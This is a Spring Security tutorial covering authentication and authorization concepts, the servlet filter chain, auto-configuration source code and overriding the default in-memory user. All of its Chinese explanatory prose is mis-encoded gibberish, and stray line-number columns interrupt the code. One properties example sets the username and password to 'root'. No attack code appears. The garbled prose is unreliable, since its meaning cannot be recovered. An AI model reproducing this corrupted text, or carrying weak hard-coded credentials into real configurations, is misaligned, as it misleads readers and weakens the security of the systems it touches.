æ¬ç¨æ·èº«ä»½è®¤è¯åææä¸¤é¨åï¼ç®ç§°è®¤è¯ææãå¯¹äºéè¦è®¿é®æ§å¶çèµæºç¨æ·é¦åç»è¿èº«ä»½è®¤è¯ï¼è®¤è¯éè¿åç¨æ·å·æè¯¥èµæºçè®¿é®æéæ¹å¯è®¿é®ã\n\n# è®¤è¯\n\nèº«ä»½è®¤è¯ï¼å°±æ¯å¤æ­ä¸ä¸ªç¨æ·æ¯å¦ä¸ºåæ³ç¨æ·çå¤çè¿ç¨ãæå¸¸ç¨çç®åèº«ä»½è®¤è¯æ¹å¼æ¯ç³»ç»éè¿æ ¸å¯¹ç¨æ·è¾å¥çç¨æ·ååå£ä»¤ï¼çå¶æ¯å¦ä¸ç³»ç»ä¸­å­å¨çè¯¥ç¨æ·çç¨æ·ååå£ä»¤ä¸è´ï¼æ¥å¤æ­ç¨æ·èº«ä»½æ¯å¦æ­£ç¡®ãå¯¹äºéç¨æçº¹ç­ç³»ç»ï¼ååºç¤ºæçº¹ï¼å¯¹äºç¡¬ä»¶Keyç­å·å¡ç³»ç»ï¼åéè¦å·å¡ã\n\n# ææ\n\nææï¼å³è®¿é®æ§å¶ï¼æ§å¶è°è½è®¿é®åªäºèµæºãä¸»ä½è¿è¡èº«ä»½è®¤è¯åéè¦åéæéæ¹å¯è®¿é®ç³»ç»çèµæºï¼å¯¹äºæäºèµæºæ²¡ææéæ¯æ æ³è®¿é®çã\n\n# å¸¸è§è§£å³æ¹æ¡\n\n * Shiro\n   * Shiro æ¬èº«æ¯ä¸ä¸ªèççå®å¨ç®¡çæ¡æ¶ï¼æçä¼å¤çä¼ç¹ï¼ä¾å¦è½»éãç®åãæäºéæãå¯ä»¥å¨JavaSEç¯å¢ä¸­ä½¿ç¨ç­ãä¸è¿ï¼å¨å¾®æå¡æ¶ä»£ï¼Shiro å°±æ¾å¾åä¸ä»å¿äºï¼å¨å¾®æå¡é¢ååæ©å±æ¹é¢ï¼æ æ³ååå±ç¤ºèªå·±çä¼å¿ã\n * å¼åèèªå®ä¹\n   * ä¹æå¾å¤å¬å¸éæ©èªå®ä¹æéï¼å³èªå·±å¼åæéç®¡çãä½æ¯ä¸ä¸ªç³»ç»çå®å¨ï¼ä¸ä»ä»æ¯ç»å½åæéæ§å¶è¿ä¹ç®åï¼æä»¬è¿è¦èèç§åæ ·å¯è½å­å¨çç½ç»æ¿å»ä»¥åé²å½»ç­ç¥ï¼ä»è¿ä¸ªè§åº¦æ¥è¯´ï¼å¼åèç½å·±å®ç°å®å¨ç®¡çä¹å¹¶éæ¯ä¸ä»¶å®¹æçäºæï¼åªæå¤§å¬å¸ææè¶³å¤çäººåç©åå»æ¯æè¿ä»¶äºæã\n * Spring Security\n   * Spring Security,ä½ä¸ºspring å®¶æçä¸åï¼å¨å Spring å®¶æçå¶ä»æåå¦ Spring Boot Spring Clondç­è¿è¡æ´åæ¶ï¼å·æå¶ä»æ¡æ¶æ å¯æ¯æçä¼å¿ï¼åæ¶å¯¹ OAuth2 æçè¯å¥½çæ¯æï¼åå ä¸Spring Cloudå¯¹ Spring Securityçä¸æ­å æï¼å¦æ¨åº Spring Cloud Security )ï¼è®© Spring Securiy ä¸ç¥ä¸è§ä¸­æä¸ºå¾®æå¡é¡¹ç®çé¦éå®å¨ç®¡çæ¹æ¡ã\n\n\n# ç®ä»\n\nSpring Securityæ¯ä¸ä¸ªåè½å¼ºå¤§ãå¯é«åº¦å®å¶çèº«ä»½éªè¯åè®¿é®æ§å¶æ¡æ¶ãå®æ¯ä¿æ¤åºäºSpringçåºç¨ç¨åºçäºå®æ åã\n\nSpring Securityæ¯ä¸ä¸ªé¢åJavaåºç¨ç¨åºæä¾èº«ä»½éªè¯åå®å¨æ§çæ¡æ¶ãä¸ææSpringé¡¹ç®ä¸æ ·ï¼Spring Securityççæ­£å¨åå¨äºå®å¯ä»¥è½»æ¾å°æ©å±ä»¥æ»¡è¶³å®å¶éæ±ã\n\n\n# åå²\n\nSpring Security ææ©å« Acegi Securityï¼ è¿ä¸ªåç§°å¹¶ä¸æ¯è¯´å®å Spring å°±æ²¡æå³ç³»ï¼å®ä¾ç¶æ¯ä¸ºSpring æ¡æ¶æä¾å®å¨æ¯æçãAcegi Security åºäº Springï¼å¯ä»¥å¸®å©æä»¬ä¸ºé¡¹ç®å»ºç«ä¸°å¯çè§è²ä¸æéç®¡çç³»ç»ãAcegi security è½ç¶å¥½ç¨ï¼ä½æ¯æä¸ºäººè¯ççåæ¯å®èè¿ç¦ççéç½®è¿ä¸é®é¢æç»ä¹éä¼ ç»äº Spring Securityã\n\nAcegi Security æç»è¢«å¹¶å¥ Spring Security é¡¹ç®ä¸­ï¼å¹¶äº 2008 å¹´4æåå¸äºæ¹ååçç¬¬ä¸ä¸ªçæ¬ Spring Security 2.0.0ï¼å°ç®åä¸ºæ­¢ï¼Spring Security çææ°çæ¬å·±ç»å°äº 5.6.1ãå Shiro ç¸æ¯ï¼Spring Securityééçº§å¹¶ä¸éç½®ç¦çï¼ç´è³ä»å¤©ï¼ä¾ç¶æäººä»¥æ­¤ä¸ºçç±èæç»äºè§£ Spring Securityãå¶å®ï¼èªä» Spring Boot æ¨åºåï¼å°±å½»åºé¢ è¦äºä¼ ç»äº JavaEE å¼åï¼èªå¨åéç½®è®©è®¸å¤äºæåå¾éå¸¸å®¹æï¼åæ¬ Spring Security çéç½®ãå¨ä¸ä¸ª Spring Boot é¡¹ç®ä¸­ï¼æä»¬çè³åªéè¦å¼å¥ä¸ä¸ªä¾èµï¼ä¸éè¦ä»»ä½é¢å¤éç½®ï¼é¡¹ç®çæææ¥å£å°±ä¼è¢«èªå¨ä¿æ¤èµ·æ¥äºãå¨ Spring Cloudä¸­ï¼å¾å¤æ¶åå®å¨ç®¡ççé®é¢ï¼ä¹æ¯ä¸ä¸ª Spring Security ä¾èµä¸¤è¡éç½®å°±è½æå®ï¼å¨å Spring å®¶æçäº§åä¸èµ·ä½¿ç¨æ¶ï¼Spring Security çä¼å¿å°±éå¸¸ææ¾äºã\n\nå æ­¤ï¼å¨å¾®æå¡æ¶ä»£ï¼æä»¬ä¸éè¦çº ç»è¦ä¸è¦å­¦ä¹  Spring Securityï¼æä»¬è¦èèçæ¯å¦ä½å¿«éææ¡Spring Securityï¼ å¹¶ä¸è½å¤ä½¿ç¨ Spring Security å®ç°æä»¬å¾®æå¡çå®å¨ç®¡çã\n\n\n# æ´ä½æ¶æ\n\nå¨Spring Securityçæ¶æè®¾è®¡ä¸­ï¼è®¤è¯Authenticationåææ Authorizationæ¯åå¼çï¼æ è®ºä½¿ç¨ä»ä¹æ ·çè®¤è¯æ¹å¼ãé½ä¸ä¼å½±åææï¼è¿æ¯ä¸¤ä¸ªç¬ç«çå­å¨ï¼è¿ç§ç¬ç«å¸¦æ¥çå¥½å¤ä¹ä¸ï¼å°±æ¯å¯ä»¥éå¸¸æ¹ä¾¿å°æ´åä¸äºå¤é¨çè§£å³æ¹æ¡ã\n\n\n\n\n# è®¤è¯åç\n\n# AuthenticationManager\n\nå¨Spring Securityä¸­è®¤è¯æ¯ç±AuthenticationManageræ¥å£æ¥è´è´£çï¼æ¥å£å®ä¹ä¸ºï¼\n\n\n\npublic interface AuthenticationManager { \n\tAuthentication authenticate(Authentication authentication) \n  \t\t\t\t\t\t\t\t\t\t\t\t\t\tthrows AuthenticationException;\n}\n\n\n1\n2\n3\n4\n\n * è¿å Authentication è¡¨ç¤ºè®¤è¯æå\n * è¿å AuthenticationException å¼å¸¸ï¼è¡¨ç¤ºè®¤è¯å¤±è´¥ã\n\nAuthenticationManager ä¸»è¦å®ç°ç±»ä¸º ProviderManagerï¼å¨ ProviderManager ä¸­ç®¡çäºä¼å¤ AuthenticationProvider å®ä¾ãå¨ä¸æ¬¡å®æ´çè®¤è¯æµç¨ä¸­ï¼Spring Security åè®¸å­å¨å¤ä¸ª AuthenticationProvider ï¼ç¨æ¥å®ç°å¤ç§è®¤è¯æ¹å¼ï¼è¿äº AuthenticationProvider é½æ¯ç± ProviderManager è¿è¡ç»ä¸ç®¡ççã\n\n\n\n# Authentication\n\nè®¤è¯ä»¥åè®¤è¯æåçä¿¡æ¯ä¸»è¦æ¯ç± Authentication çå®ç°ç±»è¿è¡ä¿å­çï¼å¶æ¥å£å®ä¹ä¸ºï¼\n\n\n\npublic interface Authentication extends Principal, Serializable {\n\tCollection<? extends GrantedAuthority> getAuthorities();\n\tObject getCredentials();\n\tObject getDetails();\n\tObject getPrincipal();\n\tboolean isAuthenticated();\n\tvoid setAuthenticated(boolean isAuthenticated) throws IllegalArgumentException;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n * getAuthorities è·åç¨æ·æéä¿¡æ¯\n * getCredentials è·åç¨æ·å­è¯ä¿¡æ¯ï¼ä¸è¬æå¯ç \n * getDetails è·åç¨æ·è¯¦ç»ä¿¡æ¯\n * getPrincipal è·åç¨æ·èº«ä»½ä¿¡æ¯ï¼ç¨æ·åãç¨æ·å¯¹è±¡ç­\n * isAuthenticated ç¨æ·æ¯å¦è®¤è¯æå\n\n# SecurityContextHolder\n\nSecurityContextHolder ç¨æ¥è·åç»å½ä¹åç¨æ·ä¿¡æ¯ãSpring Security ä¼å°ç»å½ç¨æ·æ°æ®ä¿å­å¨ Session ä¸­ãä½æ¯ï¼ä¸ºäºä½¿ç¨æ¹ä¾¿,Spring Securityå¨æ­¤åºç¡ä¸è¿åäºä¸äºæ¹è¿ï¼å¶ä¸­æä¸»è¦çä¸ä¸ªååå°±æ¯çº¿ç¨ç»å®ãå½ç¨æ·ç»å½æåå,Spring Security ä¼å°ç»å½æåçç¨æ·ä¿¡æ¯ä¿å­å° SecurityContextHolder ä¸­ãSecurityContextHolder ä¸­çæ°æ®ä¿å­é»è®¤æ¯éè¿ThreadLocal æ¥å®ç°çï¼ä½¿ç¨ ThreadLocal åå»ºçåéåªè½è¢«å½åçº¿ç¨è®¿é®ï¼ä¸è½è¢«å¶ä»çº¿ç¨è®¿é®åä¿®æ¹ï¼ä¹å°±æ¯ç¨æ·æ°æ®åè¯·æ±çº¿ç¨ç»å®å¨ä¸èµ·ãå½ç»å½è¯·æ±å¤çå®æ¯åï¼Spring Security ä¼å° SecurityContextHolder ä¸­çæ°æ®æ¿åºæ¥ä¿å­å° Session ä¸­ï¼åæ¶å° SecurityContexHolder ä¸­çæ°æ®æ¸ç©ºãä»¥åæ¯å½æè¯·æ±å°æ¥æ¶ï¼Spring Security å°±ä¼åä» Session ä¸­ååºç¨æ·ç»å½æ°æ®ï¼ä¿å­å° SecurityContextHolder ä¸­ï¼æ¹ä¾¿å¨è¯¥è¯·æ±çåç»­å¤çè¿ç¨ä¸­ä½¿ç¨ï¼åæ¶å¨è¯·æ±ç»ææ¶å° SecurityContextHolder ä¸­çæ°æ®æ¿åºæ¥ä¿å­å° Session ä¸­ï¼ç¶åå° Security SecurityContextHolder ä¸­çæ°æ®æ¸ç©ºãè¿ä¸ç­ç¥éå¸¸æ¹ä¾¿ç¨æ·å¨ ControllerãService å±ä»¥åä»»ä½ä»£ç ä¸­è·åå½åç»å½ç¨æ·æ°æ®ã\n\n\n# ææåç\n\nå½å®æè®¤è¯åï¼æ¥ä¸ç±³å°±æ¯ææäºãå¨ Spring Security çææä½ç³»ä¸­ï¼æä¸¤ä¸ªå³é®æ¥å£ï¼\n\n# AccessDecisionManager\n\n> AccessDecisionManager (è®¿é®å³ç­ç®¡çå¨)ï¼ç¨æ¥å³å®æ­¤æ¬¡è®¿é®æ¯å¦è¢«åè®¸ã\n\n\n\n# AccessDecisionVoter\n\n> AccessDecisionVoter (è®¿é®å³å®æç¥¨å¨)ï¼æç¥¨å¨ä¼æ£æ¥ç¨æ·æ¯å¦å·å¤åºæçè§è²ï¼è¿èæåºèµæãåå¯¹æèå¼æç¥¨ã\n\n\n\nAccessDecisionVoter å AccessDecisionManager é½æä¼å¤çå®ç°ç±»ï¼å¨ AccessDecisionManager ä¸­ä¼æ¢ä¸ªéå AccessDecisionVoterï¼è¿èå³å®æ¯å¦åè®¸ç¨æ·è®¿é®ï¼å è AccesdDecisionVoter å AccessDecisionManager ä¸¤èçå³ç³»ç±»ä¼¼äº AuthenticationProvider å ProviderManager çå³ç³»ã\n\n# ConfigAttribute\n\n> ConfigAttributeï¼ç¨æ¥ä¿å­æææ¶çè§è²ä¿¡æ¯\n\n\n\nå¨ Spring Security ä¸­ï¼ç¨æ·è¯·æ±ä¸ä¸ªèµæº(éå¸¸æ¯ä¸ä¸ªæ¥å£æèä¸ä¸ª Java æ¹æ³)éè¦çè§è²ä¼è¢«å°è£æä¸ä¸ª ConfigAttribute å¯¹è±¡ï¼å¨ ConfigAttribute ä¸­åªæä¸ä¸ª getAttributeæ¹æ³ï¼è¯¥æ¹æ³è¿åä¸ä¸ª String å­ç¬¦ä¸²ï¼å°±æ¯è§è²çåç§°ãä¸è¬æ¥è¯´ï¼è§è²åç§°é½å¸¦æä¸ä¸ª ROLE_ åç¼ï¼æç¥¨å¨ AccessDecisionVoter æåçäºæï¼å¶å®å°±æ¯æ¯è¾ç¨æ·æå·åçè§è²åè¯·æ±æä¸ª èµæºæéç ConfigAtuibute ä¹é´çå³ç³»ã\n\n\n# HelloWorld\n\n\n# ç¯å¢æ­å»º\n\n# 0. åå»ºSpringboot webé¡¹ç®\n\n<parent>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-parent</artifactId>\n  <version>2.6.6</version>\n  <relativePath/> \x3c!-- lookup parent from repository --\x3e\n</parent>\n\n<dependency>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-thymeleaf</artifactId>\n</dependency>\n\n<dependency>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-web</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# 1. ç¼åController\n\npackage com.pwddd.springsecurity.controller;\n\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RestController;\n\n@RestController\npublic class HelloController {\n\n  @RequestMapping("hello")\n  public String hello(){\n    System.out.println("hello");\n    return "123";\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# 2. æµè¯è®¿é®\n\n\n\n# 3. å¼å¥Spring Securityä¾èµ\n\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-security</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n\n\n# 4. ç»ééªè¯\n\nç»éå¯ç ä¸ºæ§å¶å°æå°çå¯ç ï¼é»è®¤ç¨æ·åä¸ºuserã\n\n\n\nç»éä¹åï¼å¯ä»¥æ­£å¸¸è®¿é®ã\n\n\n\né®é¢ï¼\n\n * ä¸ºä»ä¹å¼å¥ Spring Security ä¹åæ²¡æä»»ä½éç½®ææè¯·æ±å°±è¦è®¤è¯å¢?\n\n * å¨é¡¹ç®ä¸­æææ²¡æç»å½çé¢ï¼ç»å½çé¢æä¹æ¥çå¢ï¼\n\n * ä¸ºä»ä¹ä½¿ç¨ user å æ§å¶å°å¯ç  è½ç»éï¼ç»å½æ¶éªè¯æ°æ®æºå­å¨åªéå¢ï¼\n\n\n# å®ç°åç\n\n# æ¶æå¾\n\nææ¡£å°åï¼https://docs.spring.io/spring-security/site/docs/5.5.4/reference/html5/#servlet-architecture\n\nè½ç¶å¼åèåªéè¦å¼å¥ä¸ä¸ªä¾èµï¼å°±å¯ä»¥è®© Spring Security å¯¹åºç¨è¿è¡ä¿æ¤ãSpring Security åæ¯å¦ä½åå°çå¢ï¼\n\nå¨ Spring Security ä¸­ è®¤è¯ãææ ç­åè½é½æ¯åºäºè¿æ»¤å¨å®æçã\n\n\n\n\n\néè¦æ³¨æçæ¯ï¼é»è®¤è¿æ»¤å¨å¹¶ä¸æ¯ç´æ¥æ¾å¨ Web é¡¹ç®çåçè¿æ»¤å¨é¾ä¸­ï¼èæ¯éè¿ä¸ä¸ª FlterChainProxy æ¥ç»ä¸ç®¡çãSpring Security ä¸­çè¿æ»¤å¨é¾éè¿ FilterChainProxy åµå¥å° Webé¡¹ç®çåçè¿æ»¤å¨é¾ä¸­ãFilterChainProxy ä½ä¸ºä¸ä¸ªé¡¶å±çç®¡çèï¼å°ç»ä¸ç®¡ç Security FilterãFilterChainProxy æ¬èº«æ¯éè¿ Spring æ¡æ¶æä¾ç DelegatingFilterProxy æ´åå°åççè¿æ»¤å¨é¾ä¸­ã\n\n# Security Filters\n\né£ä¹å¨ Spring Security ä¸­ç»æä»¬æä¾é£äºè¿æ»¤å¨? é»è®¤æåµä¸é£äºè¿æ»¤å¨ä¼è¢«å è½½å¢ï¼\n\nè¿æ»¤å¨                                             è¿æ»¤å¨ä½ç¨                                       é»è®¤æ¯å¦å è½½\nChannelProcessingFilter                         è¿æ»¤è¯·æ±åè®® HTTP ãHTTPS                          NO\nWebAsyncManagerIntegrationFilter                å° WebAsyncManger ä¸ SpringSecurity ä¸ä¸æè¿è¡éæ   YES\nSecurityContextPersistenceFilter                å¨å¤çè¯·æ±ä¹å,å°å®å¨ä¿¡æ¯å è½½å° SecurityContextHolder ä¸­    YES\nHeaderWriterFilter                              å¤çå¤´ä¿¡æ¯å å¥ååºä¸­                                  YES\nCorsFilter                                      å¤çè·¨åé®é¢                                      NO\nCsrfFilter                                      å¤ç CSRF æ»å»                                  YES\nLogoutFilter                                    å¤çæ³¨éç»å½                                      YES\nOAuth2AuthorizationRequestRedirectFilter        å¤ç OAuth2 è®¤è¯éå®å                             NO\nSaml2WebSsoAuthenticationRequestFilter          å¤ç SAML è®¤è¯                                  NO\nX509AuthenticationFilter                        å¤ç X509 è®¤è¯                                  NO\nAbstractPreAuthenticatedProcessingFilter        å¤çé¢è®¤è¯é®é¢                                     NO\nCasAuthenticationFilter                         å¤ç CAS åç¹ç»å½                                 NO\nOAuth2LoginAuthenticationFilter                 å¤ç OAuth2 è®¤è¯                                NO\nSaml2WebSsoAuthenticationFilter                 å¤ç SAML è®¤è¯                                  NO\nUsernamePasswordAuthenticationFilter            å¤çè¡¨åç»å½                                      YES\nOpenIDAuthenticationFilter                      å¤ç OpenID è®¤è¯                                NO\nDefaultLoginPageGeneratingFilter                éç½®é»è®¤ç»å½é¡µé¢                                    YES\nDefaultLogoutPageGeneratingFilter               éç½®é»è®¤æ³¨éé¡µé¢                                    YES\nConcurrentSessionFilter                         å¤ç Session æææ                              NO\nDigestAuthenticationFilter                      å¤ç HTTP æè¦è®¤è¯                                NO\nBearerTokenAuthenticationFilter                 å¤ç OAuth2 è®¤è¯ç Access Token                  NO\nBasicAuthenticationFilter                       å¤ç HttpBasic ç»å½                             YES\nRequestCacheAwareFilter                         å¤çè¯·æ±ç¼å­                                      YES\nSecurityContextHolder<br />AwareRequestFilter   åè£åå§è¯·æ±                                      YES\nJaasApiIntegrationFilter                        å¤ç JAAS è®¤è¯                                  NO\nRememberMeAuthenticationFilter                  å¤ç RememberMe ç»å½                            NO\nAnonymousAuthenticationFilter                   éç½®å¿åè®¤è¯                                      YES\nOAuth2AuthorizationCodeGrantFilter              å¤çOAuth2è®¤è¯ä¸­ææç                               NO\nSessionManagementFilter                         å¤ç session å¹¶åé®é¢                             YES\nExceptionTranslationFilter                      å¤çè®¤è¯/ææä¸­çå¼å¸¸                                 YES\nFilterSecurityInterceptor                       å¤çææç¸å³                                      YES\nSwitchUserFilter                                å¤çè´¦æ·åæ¢                                      NO\n\nå¯ä»¥çåºï¼Spring Security æä¾äº 30 å¤ä¸ªè¿æ»¤å¨ã\n\né»è®¤æåµä¸Spring Boot å¨å¯¹ Spring Security è¿å¥èªå¨åéç½®æ¶ï¼ä¼åå»ºä¸ä¸ªåä¸º SpringSecurityFilerChain çè¿æ»¤å¨ï¼å¹¶æ³¨å¥å° Spring å®¹å¨ä¸­ï¼è¿ä¸ªè¿æ»¤å¨å°è´è´£ææçå®å¨ç®¡çï¼åæ¬ç¨æ·è®¤è¯ãææãéå®åå°ç»å½é¡µé¢ç­ãå·ä½å¯ä»¥åèWebSecurityConfigurationçæºç :\n\n\n\n\n\n# Spring Securityèªå¨éç½®åç\n\nSpringBootWebSecurityConfigurationè¿ä¸ªç±»æ¯ spring boot èªå¨éç½®ç±»ï¼éè¿è¿ä¸ªæºç å¾ç¥ï¼é»è®¤æåµä¸å¯¹ææè¯·æ±è¿è¡æéæ§å¶ï¼\n\n@Configuration(proxyBeanMethods = false)\n@ConditionalOnDefaultWebSecurity\n@ConditionalOnWebApplication(type = Type.SERVLET)\nclass SpringBootWebSecurityConfiguration {\n\t@Bean\n\t@Order(SecurityProperties.BASIC_AUTH_ORDER)\n\tSecurityFilterChain defaultSecurityFilterChain(HttpSecurity http) \n    throws Exception {\n\t\t\thttp.authorizeRequests().anyRequest()\n      .authenticated().and().formLogin().and().httpBasic();\n\t\treturn http.build();\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nè¿å°±æ¯ä¸ºä»ä¹å¨å¼å¥ Spring Security ä¸­æ²¡æä»»ä½éç½®æåµä¸ï¼è¯·æ±ä¼è¢«æ¦æªçåå \n\n\n\nè¿å¥ConditionalOnDefaultWebSecurityæ³¨è§£å¯¹åºçç±»ä¸­ï¼æä»¬å¯ä»¥çåºSecurityçæçæ¡ä»¶æ¯ï¼\n\nclass DefaultWebSecurityCondition extends AllNestedConditions {\n\n\tDefaultWebSecurityCondition() {\n\t\tsuper(ConfigurationPhase.REGISTER_BEAN);\n\t}\n\n\t@ConditionalOnClass({ SecurityFilterChain.class, HttpSecurity.class })\n\tstatic class Classes {\n\n\t}\n\n\t@ConditionalOnMissingBean({ WebSecurityConfigurerAdapter.class, SecurityFilterChain.class })\n\tstatic class Beans {\n\t}\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n * æ¡ä»¶ä¸ classpathä¸­å­å¨ SecurityFilterChain.class, HttpSecurity.class\n * æ¡ä»¶äº æ²¡æèªå®ä¹ WebSecurityConfigurerAdapter.class, SecurityFilterChain.class\n\né»è®¤æåµä¸ï¼æ¡ä»¶é½æ¯æ»¡è¶³çãWebSecurityConfigurerAdapter è¿ä¸ªç±»æå¶éè¦ï¼Spring Security æ ¸å¿éç½®é½å¨è¿ä¸ªç±»ä¸­ãå¦æè¦å¯¹ Spring Security è¿è¡èªå®ä¹éç½®ï¼å°±è¦èªå®ä¹è¿ä¸ªç±»å®ä¾ï¼éè¿è¦çç±»ä¸­æ¹æ³è¾¾å°ä¿®æ¹é»è®¤éç½®çç®çã\n\n\n\n# æµç¨åæ\n\n\n\n 1. è¯·æ± /hello æ¥å£ï¼å¨å¼å¥ spring security ä¹åä¼åç»è¿ä¸äºåè¿æ»¤å¨\n 2. å¨è¯·æ±å°è¾¾ FilterSecurityInterceptoræ¶ï¼åç°è¯·æ±å¹¶æªè®¤è¯ãè¯·æ±æ¦æªä¸æ¥ï¼å¹¶æåº AccessDeniedException å¼å¸¸ã\n 3. æåº AccessDeniedException çå¼å¸¸ä¼è¢« ExceptionTranslationFilter æè·ï¼è¿ä¸ª Filter ä¸­ä¼è°ç¨ LoginUrlAuthenticationEntryPoint#commence æ¹æ³ç»å®¢æ·ç«¯è¿å 302ï¼è¦æ±å®¢æ·ç«¯è¿è¡éå®åå° /login é¡µé¢ã\n 4. å®¢æ·ç«¯åé /login è¯·æ±ã\n 5. /login è¯·æ±ä¼åæ¬¡è¢«æ¦æªå¨ä¸­ DefaultLoginPageGeneratingFilter æ¦æªå°ï¼å¹¶å¨æ¦æªå¨ä¸­è¿åçæç»å½é¡µé¢ã\n\nå°±æ¯éè¿è¿ç§æ¹å¼ï¼Spring Security é»è®¤è¿æ»¤å¨ä¸­çæäºç»å½é¡µé¢ï¼å¹¶è¿åï¼\n\n# ç»éä¿¡æ¯æ ¡éªåç\n\n 1. æ¥ç SpringBootWebSecurityConfiguration#defaultSecurityFilterChain æ¹æ³è¡¨åç»å½\n\n\n\n 2. å¤çç»å½ä¸º FormLoginConfigurer ç±»ä¸­ è°ç¨UsernamePasswordAuthenticationFilterè¿ä¸ªç±»å®ä¾\n\n\n\n 3. æ¥çç±»ä¸­ UsernamePasswordAuthenticationFilter#attempAuthentication æ¹æ³å¾ç¥å®éè°ç¨ AuthenticationManager ä¸­ authenticate æ¹æ³\n\n\n\n 4. è°ç¨ ProviderManager ç±»ä¸­æ¹æ³ authenticate\n\n\n\n 5. è°ç¨äº ProviderManager å®ç°ç±»ä¸­ AbstractUserDetailsAuthenticationProviderç±»ä¸­æ¹æ³\n\n\n\n 6. æç»è°ç¨å®ç°ç±» DaoAuthenticationProvider ç±»ä¸­æ¹æ³æ¯è¾\n\n\n\n\n\nçå°è¿éå°±ç¥éé»è®¤å®ç°æ¯åºäº InMemoryUserDetailsManager è¿ä¸ªç±»,ä¹å°±æ¯åå­çå®ç°!\n\néè¿æºç åæä¹è½å¾ç¥UserDetailServiceæ¯é¡¶å±ç¶æ¥å£ï¼æ¥å£ä¸­loadUserByUserNameæ¹æ³æ¯ç¨æ¥å¨è®¤è¯æ¶è¿è¡ç¨æ·åè®¤è¯æ¹æ³ï¼é»è®¤å®ç°ä½¿ç¨æ¯åå­å®ç°ï¼å¦ææ³è¦ä¿®æ¹æ°æ®åºå®ç°æä»¬åªéè¦èªå®ä¹UserDetailServiceå®ç°ï¼æç»è¿å UserDetailså®ä¾å³å¯ã\n\n\n\n# UserDetailServiceèªå¨éç½®\n\n@Configuration(proxyBeanMethods = false)\n@ConditionalOnClass(AuthenticationManager.class)\n@ConditionalOnBean(ObjectPostProcessor.class)\n@ConditionalOnMissingBean(\n\t\tvalue = { AuthenticationManager.class, AuthenticationProvider.class, UserDetailsService.class,\n\t\t\t\tAuthenticationManagerResolver.class },\n\t\ttype = { "org.springframework.security.oauth2.jwt.JwtDecoder",\n\t\t\t\t"org.springframework.security.oauth2.server.resource.introspection.OpaqueTokenIntrospector",\n\t\t\t\t"org.springframework.security.oauth2.client.registration.ClientRegistrationRepository" })\npublic class UserDetailsServiceAutoConfiguration {\n  //....\n  @Bean\n\t@Lazy\n\tpublic InMemoryUserDetailsManager inMemoryUserDetailsManager(SecurityProperties properties,\n\t\t\tObjectProvider<PasswordEncoder> passwordEncoder) {\n\t\tSecurityProperties.User user = properties.getUser();\n\t\tList<String> roles = user.getRoles();\n\t\treturn new InMemoryUserDetailsManager(\n\t\t\t\tUser.withUsername(user.getName()).password(getOrDeducePassword(user, passwordEncoder.getIfAvailable()))\n\t\t\t\t\t\t.roles(StringUtils.toStringArray(roles)).build());\n\t}\n  //...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n 1. ä»èªå¨éç½®æºç ä¸­å¾ç¥å½ classpath ä¸å­å¨ AuthenticationManager ç±»\n 2. å½åé¡¹ç®ä¸­ï¼ç³»ç»æ²¡ææä¾ AuthenticationManager.classã AuthenticationProvider.classãUserDetailsService.classã AuthenticationManagerResolver.classãå®ä¾\n\né»è®¤æåµä¸é½ä¼æ»¡è¶³ï¼æ­¤æ¶Spring Securityä¼æä¾ä¸ä¸ª InMemoryUserDetailManager å®ä¾\n\n\n\nçæSpring Bootçèªå¨å è½½åçå¯ä»¥ç¥éï¼å¾å¾ä¸ä¸ªConfigurationé½ä¼å¯¹åºä¸ä¸ªPropertieséç½®ç±»ï¼æä»¬å¯ä»¥åçä¸ä¸è¿ä¸ªéç½®ç±»ï¼\n\n\n\nå¯ä»¥çåºï¼æä»¬å¦æéè¦èªå®ä¹ä¸äºéç½®çè¯ï¼ä½¿ç¨çåç¼æ¯spring.securityãæ¼æ¥ä¸å¯¹åºçå±æ§å³å¯ã\n\n@ConfigurationProperties(prefix = "spring.security")\npublic class SecurityProperties {\n\tprivate final User user = new User();\n\tpublic User getUser() {\n\t\treturn this.user;\n  }\n  //....\n\tpublic static class User {\n\t\tprivate String name = "user";\n\t\tprivate String password = UUID.randomUUID().toString();\n\t\tprivate List<String> roles = new ArrayList<>();\n\t\tprivate boolean passwordGenerated = true;\n\t\t//get set ...\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nè¿å°±æ¯é»è®¤çæ user ä»¥å uuid å¯ç è¿ç¨! å¦å¤çæç½æºç ä¹åï¼å°±ç¥éåªè¦å¨éç½®æä»¶ä¸­å å¥å¦ä¸éç½®å¯ä»¥å¯¹åå­ä¸­ç¨æ·åå¯ç è¿è¡è¦çã\n\nspring.security.user.name=root\nspring.security.user.password=root\nspring.security.user.roles=admin,users\n\n\n1\n2\n3\n\n\n# æ»ç»\n\nAuthenticationManagerãProviderMangerãä»¥å AuthenticationProvider å³ç³»\n\n\n\nWebSecurityConfigurerAdapter æ©å± Spring Security ææé»è®¤éç½®\n\n\n\nUserDetailService ç¨æ¥ä¿®æ¹é»è®¤è®¤è¯çæ°æ®æºä¿¡æ¯\n\n\n\n\n# èªå®ä¹è®¤è¯\n\nèªå®ä¹è®¤è¯è¿ä¸é¨ååå«ä»¥ä¸çåå®¹ï¼\n\n * èªå®ä¹èµæºæéè§å\n * èªå®ä¹è®¤è¯çé¢\n * èªå®ä¹è®¤è¯æåå¤ç\n * èªå®ä¹è®¤è¯å¤±è´¥å¤ç\n * èªå®ä¹æ³¨éå¤ç\n * ç»éæååçä¿¡æ¯è·å\n * èªå®ä¹è®¤è¯æ°æ®æº\n * åºäºWebçè®¤è¯æ¡ä¾\n * 